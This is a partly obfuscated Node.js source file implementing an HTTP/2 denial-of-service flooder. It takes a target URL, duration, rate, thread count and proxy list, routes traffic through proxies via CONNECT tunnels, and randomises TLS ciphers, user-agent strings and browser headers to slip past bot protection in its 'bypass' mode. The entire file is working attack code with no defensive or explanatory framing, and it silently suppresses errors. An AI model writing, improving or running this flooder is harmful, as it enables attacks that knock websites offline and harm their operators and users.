const net = require("net");

const http2 = require("http2");

const tls = require("tls");

const cluster = require("cluster");

const url = require("url");

const crypto = require("crypto");

const fs = require("fs");

const {
  fork
} = require("child_process");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

function getRandomTLSCiphersuite() {
  const _0x50f0bb = ["TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"];

  const _0x10c5b8 = _0x50f0bb[Math.floor(Math.random() * _0x50f0bb.length)];

  return _0x10c5b8;
}

const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],
      cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0", "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const sigalgs = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(":");
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
  console.log("usage target time rate thread proxy bypass/flood");
  process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
  "ciphers": ciphers,
  "sigalgs": SignalsList,
  "honorCipherOrder": true,
  "secureOptions": secureOptions,
  "secureProtocol": secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  "target": process.argv[2],
  "time": ~~process.argv[3],
  "Rate": ~~process.argv[4],
  "threads": ~~process.argv[5],
  "proxyFile": process.argv[6],
  "input": process.argv[7]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear();
    console.log("./tcp_spoofed".blue);
    setTimeout(() => {
      process.stdout.write("\rLoading: 100%\n".blue);
    }, process.argv[3] * 1000);
    cluster.fork();
  }
} else {
  for (let i = 0; i < args.Rate; i++) {
    setInterval(runFlooder, randomIntn(10, 100));
  }
}

class NetSocket {
  constructor() {}

  ["HTTP"](_0x197e5a, _0x224fff) {
    const _0x45fcd8 = _0x197e5a.address.split(":");

    const _0x488b77 = "CONNECT " + _0x197e5a.address + ":443 HTTP/1.1\r\nHost: " + _0x197e5a.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";

    const _0x3ffd79 = new Buffer.from(_0x488b77);

    const _0x37929c = net.connect({
      "host": _0x197e5a.host,
      "port": _0x197e5a.port,
      "allowHalfOpen": true,
      "writable": true,
      "readable": true
    });

    _0x37929c.setTimeout(_0x197e5a.timeout * 600000);

    _0x37929c.setKeepAlive(true, 600000);

    _0x37929c.setNoDelay(true);

    _0x37929c.on("connect", () => {
      _0x37929c.write(_0x3ffd79);
    });

    _0x37929c.on("data", _0x303901 => {
      const _0x5327cc = _0x303901.toString("utf-8");

      const _0xd48cf4 = _0x5327cc.includes("HTTP/1.1 200");

      if (_0xd48cf4 === false) {
        _0x37929c.destroy();

        return _0x224fff(undefined, "error: invalid response from proxy server");
      }

      return _0x224fff(_0x37929c, undefined);
    });

    _0x37929c.on("timeout", () => {
      _0x37929c.destroy();

      return _0x224fff(undefined, "error: timeout exceeded");
    });
  }

}

function getRandomInt(_0x40ae9e, _0x3c7b06) {
  return Math.floor(Math.random() * (_0x3c7b06 - _0x40ae9e + 1)) + _0x40ae9e;
}

var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
var architectures = {
  "Windows NT 10.0": "" + (Math.random() < 0.5 ? "Win64; x64; rv:10" + randstra(1) + ".0" : "Win64; x64; rv:10" + randstra(3) + ".0"),
  "Windows NT 11.0": "" + (Math.random() < 0.5 ? "WOW64; Trident/" + randstra(2) + "." + randstra(1) + "; rv:10" + randstra(1) + ".0" : "Win64; x64; rv:10" + randstra(2) + ".0"),
  "Macintosh": "Intel Mac OS X 1" + randstra(1) + "_" + randstra(1) + "_" + randstra(1),
  "X11": "" + (Math.random() < 0.5 ? "Linux x86_64; rv:10" + randstra(1) + ".0" : "Linux x86_64; rv:10" + randstra(3) + ".0")
};
var browserss = ["Firefox/117.0", "Firefox/116.0", "Firefox/115.0", "Firefox/114.0", "Firefox/113.0", "Firefox/112.0", "Firefox/111.0", "Firefox/110.0"];
var browsers = ["Chrome/116.0.0.0 Safari/537.36 Edg/116", "Chrome/115.0.0.0 Safari/537.36 Edg/115", "Chrome/114.0.0.0 Safari/537.36 Edg/114", "Chrome/113.0.0.0 Safari/537.36 Edg/113", "Chrome/112.0.0.0 Safari/537.36 Edg/112", "Chrome/111.0.0.0 Safari/537.36 Edg/111", "Chrome/110.0.0.0 Safari/537.36 Edg/110", "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116", "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115", "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114", "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113", "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112", "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111", "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110", "Chrome/116.0.0.0 Safari/537.36 OPR/102", "Chrome/100.0.4896.127 Safari/537.36"];

function getRandomValue(_0x1fe5d0) {
  const _0x329d9a = Math.floor(Math.random() * _0x1fe5d0.length);

  return _0x1fe5d0[_0x329d9a];
}

function randstra(_0x10cedf) {
  const _0x4f2daa = "0123456789";
  let _0x2306ec = "";
  const _0x105623 = _0x4f2daa.length;

  for (let _0x439d67 = 0; _0x439d67 < _0x10cedf; _0x439d67++) {
    _0x2306ec += _0x4f2daa.charAt(Math.floor(Math.random() * _0x105623));
  }

  return _0x2306ec;
}

const sec12 = {
  "Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203": "\"Microsoft Edge\";v=\"116\"",
  "Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0": "\"Opera GX\";v=\"100\"",
  "Chrome/116.0.0.0 Safari/537.36": "\"Google Chrome\";v=\"116\"",
  "Version/16.5 Safari/605.1.15": "\"Safari\";v=\"15.0.0\", \"Chrome\";v=\"116\""
};
const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS];
const randomBrowser = getRandomValue(browsers);
const brand = sec12[randomBrowser];
var uas = "Mozilla/5.0 (" + randomOS + "; " + randstrs(8) + " " + randomArch + ") " + randstrs(6) + " AppleWebKit/537.36 " + randstra(7) + " (KHTML, like Gecko) " + randomBrowser;
const Socker = new NetSocket();

function readLines(_0x969f61) {
  return fs.readFileSync(_0x969f61, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x3f9e49, _0x2323b2) {
  return Math.floor(Math.random() * (_0x2323b2 - _0x3f9e49) + _0x3f9e49);
}

function randomElement(_0x20ac88) {
  return _0x20ac88[randomIntn(0, _0x20ac88.length)];
}

function randstrs(_0x4ec0c6) {
  const _0x235c6b = "0123456789";
  const _0x5a8ea6 = _0x235c6b.length;

  const _0x33e15f = crypto.randomBytes(_0x4ec0c6);

  let _0x219022 = "";

  for (let _0x421197 = 0; _0x421197 < _0x4ec0c6; _0x421197++) {
    const _0x103d3e = _0x33e15f[_0x421197] % _0x5a8ea6;

    _0x219022 += _0x235c6b.charAt(_0x103d3e);
  }

  return _0x219022;
}

function runFlooder() {
  const _0x2d4e8c = randomElement(proxies);

  const _0x53effd = _0x2d4e8c.split(":");

  const _0x288768 = parsedTarget.protocol == "https:" ? "443" : "80";

  let _0x718dcd;

  if (args.input === "flood") {
    _0x718dcd = 1000;
  } else if (args.input === "bypass") {
    function _0x3848df(_0x135596, _0x531e0c) {
      return Math.floor(Math.random() * (_0x531e0c - _0x135596 + 1)) + _0x135596;
    }

    _0x718dcd = _0x3848df(1000, 7000);
  } else {
    process.stdout.write("default : flood\r");
    _0x718dcd = 1000;
  }

  const _0x5014f6 = ["text/plain", "text/html", "application/json", "application/xml", "multipart/form-data", "application/octet-stream", "image/jpeg", "image/png", "audio/mpeg", "video/mp4", "application/javascript", "application/pdf", "application/vnd.ms-excel", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip", "image/gif", "image/bmp", "image/tiff", "audio/wav", "audio/midi", "video/avi", "video/mpeg", "video/quicktime", "text/csv", "text/xml", "text/css", "text/javascript", "application/graphql", "application/x-www-form-urlencoded", "application/vnd.api+json", "application/ld+json", "application/x-pkcs12", "application/x-pkcs7-certificates", "application/x-pkcs7-certreqresp", "application/x-pem-file", "application/x-x509-ca-cert", "application/x-x509-user-cert", "application/x-x509-server-cert", "application/x-bzip", "application/x-gzip", "application/x-7z-compressed", "application/x-rar-compressed", "application/x-shockwave-flash"];
  encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity"];

  function _0x15cde6(_0x508d6b) {
    const _0x3098ee = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let _0x233206 = "";
    const _0x336760 = _0x3098ee.length;

    for (let _0x422782 = 0; _0x422782 < _0x508d6b; _0x422782++) {
      _0x233206 += _0x3098ee.charAt(Math.floor(Math.random() * _0x336760));
    }

    return _0x233206;
  }

  function _0x2b965f(_0x374d0a) {
    const _0x4a3643 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let _0x2a0c0a = "";
    const _0x39cf96 = _0x4a3643.length;

    for (let _0x597ac7 = 0; _0x597ac7 < _0x374d0a; _0x597ac7++) {
      _0x2a0c0a += _0x4a3643.charAt(Math.floor(Math.random() * _0x39cf96));
    }

    return _0x2a0c0a;
  }

  function _0x35ba27(_0x8f38f2, _0x365e12) {
    const _0x4f60ee = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    const _0x3b9497 = Math.floor(Math.random() * (_0x365e12 - _0x8f38f2 + 1)) + _0x8f38f2;

    const _0x1b918c = Array.from({
      "length": _0x3b9497
    }, () => {
      const _0x582b5b = Math.floor(Math.random() * _0x4f60ee.length);

      return _0x4f60ee[_0x582b5b];
    });

    return _0x1b918c.join("");
  }

  const _0x136eea = [{
    "dnt": "1"
  }, {
    "te": "trailers"
  }, {
    "origin": "https://" + parsedTarget.host
  }, {
    "referer": "https://" + parsedTarget.host + "/"
  }, {
    "source-ip": _0x2b965f(5)
  }, {
    "viewport-width": "1920"
  }, {
    "device-memory": "0.25"
  }];
  const _0x46f839 = [{
    "dnt": "1"
  }, {
    "origin": "https://" + parsedTarget.host
  }, {
    "referer": "https://" + parsedTarget.host + "/"
  }, {
    "cookie": _0x2b965f(5) + "=" + _0x2b965f(5)
  },, {
    "viewport-width": "1920"
  }, {
    "device-memory": "0.25"
  }];
  let _0x29bb8c = {
    ":authority": parsedTarget.host,
    ":method": "GET",
    "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
    "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
    ":path": parsedTarget.path,
    ":scheme": "https",
    "content-type": _0x5014f6[Math.floor(Math.random() * _0x5014f6.length)],
    "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
    "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
    "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
    "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
    "user-agent": uas
  };
  const _0x43cc57 = {
    "host": _0x53effd[0],
    "port": ~~_0x53effd[1],
    "address": parsedTarget.host + ":443",
    "x-forwarded-for": _0x53effd[0],
    "timeout": 15
  };
  Socker.HTTP(_0x43cc57, (_0x220f6e, _0xdee71a) => {
    if (_0xdee71a) return;

    _0x220f6e.setKeepAlive(true, 600000);

    _0x220f6e.setNoDelay(true);

    const _0x16dddd = {
      "enablePush": false,
      "initialWindowSize": 15564991
    };
    tls.DEFAULT_MAX_VERSION = "TLSv1.3";
    const _0x18e46f = {
      "port": _0x288768,
      "secure": true,
      "ALPNProtocols": ["h2", "http/1.1", "spdy/3.1"],
      "ciphers": ciphers,
      "sigalgs": sigalgs,
      "requestCert": true,
      "socket": _0x220f6e,
      "ecdhCurve": ecdhCurve,
      "honorCipherOrder": false,
      "rejectUnauthorized": false,
      "secureOptions": secureOptions,
      "secureContext": secureContext,
      "host": parsedTarget.host,
      "servername": parsedTarget.host,
      "secureProtocol": secureProtocol
    };

    const _0x3b0424 = tls.connect(_0x288768, parsedTarget.host, _0x18e46f);

    _0x3b0424.allowHalfOpen = true;

    _0x3b0424.setNoDelay(true);

    _0x3b0424.setKeepAlive(true, 600000);

    _0x3b0424.setMaxListeners(0);

    const _0x7ceba0 = http2.connect(parsedTarget.href, {
      "settings": {
        "initialWindowSize": 15564991,
        "maxFrameSize": 236619
      },
      "createConnection": () => _0x3b0424,
      "socket": _0x220f6e
    });

    _0x7ceba0.settings({
      "initialWindowSize": 15564991,
      "maxFrameSize": 236619
    });

    _0x7ceba0.setMaxListeners(0);

    _0x7ceba0.settings(_0x16dddd);

    _0x7ceba0.on("connect", () => {
      return;
    });

    _0x7ceba0.on("close", () => {
      _0x7ceba0.destroy();

      _0x3b0424.destroy();

      _0x220f6e.destroy();

      return;
    });

    _0x7ceba0.on("timeout", () => {
      _0x7ceba0.destroy();

      _0x220f6e.destroy();

      return;
    });

    _0x7ceba0.on("error", _0xdee71a => {
      _0x7ceba0.destroy();

      _0x3b0424.destroy();

      _0x220f6e.destroy();

      return;
    });
  });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);
process.on("uncaughtException", _0x3952c8 => {});
process.on("unhandledRejection", _0x29cf71 => {});
_0xodu = "jsjiami.com.v6";